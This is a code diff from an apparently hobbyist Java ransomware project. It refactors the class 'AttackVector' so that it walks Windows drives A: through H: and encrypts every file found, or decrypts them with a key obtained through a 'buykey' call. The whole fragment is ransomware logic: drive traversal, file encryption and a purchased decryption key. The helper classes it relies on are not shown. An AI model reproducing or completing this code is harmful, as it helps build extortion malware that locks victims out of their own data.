@@ -16,19 +16,13 @@ public class AttackVector {
 
 	private KeyService keyService;
 
-	public void attack() throws RansomwareException {
+	private void attack(CryptoKey key, Cryptable cryptFunc) throws RansomwareException {
 		Traverse<File> dfs = new DFS<File>();
 		// or
 		Traverse<File> bfs = new BFS<File>();
 
 		Collection<File> visitedFolders = Collections.emptySet();
 
-		// Default
-		Cryptable cryptFunc = new EncryptFile();
-
-		CryptoKey key = encryptionKey();
-		// or
-		key = decryptionKey(cryptFunc);
 		for (char i = 'A'; i <= 'H'; i++) {
 			try {
 				traverseAndCrypt(i + ":\\", visitedFolders, key, bfs, cryptFunc);
@@ -39,19 +33,18 @@ public class AttackVector {
 		}
 	}
 
-	private CryptoKey encryptionKey() throws RansomwareException {
+	public void encryptFileSystem() throws RansomwareException {
 		try {
-			return keyService.getKey();
+			attack(keyService.getKey(), new EncryptFile());
 		} catch (RansomwareException e) {
 			throw new RansomwareException(e.getMessage(), e.getCause());
 		}
+
 	}
 
-	private CryptoKey decryptionKey(Cryptable cryptFunc) throws RansomwareException {
-
-		cryptFunc = new DecryptFile();
+	public void decryptFileSystem(Cryptable cryptFunc) throws RansomwareException {
 		try {
-			return keyService.buykey();
+			attack(keyService.buykey(), new DecryptFile());
 		} catch (RansomwareException e) {
 			throw new RansomwareException(e.getMessage(), e.getCause());
 		}
